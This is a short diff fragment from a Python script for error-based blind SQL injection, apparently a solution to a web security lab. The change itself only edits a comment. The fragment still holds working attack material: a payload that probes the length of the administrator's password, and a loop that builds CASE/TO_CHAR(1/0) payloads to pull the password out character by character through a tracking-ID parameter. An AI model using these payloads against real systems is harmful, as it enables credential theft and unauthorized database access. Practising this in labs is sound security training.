@@ -38,7 +38,7 @@ password = ""
 
 print("[*] Starting Error-Based Blind SQLi Extraction...")
 
-# use `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--` to determine password length first using burp suite
+# use ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- to determine password length first using burp suite
 for position in range(1, 21):
     for char in charset:
         payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password, {position}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
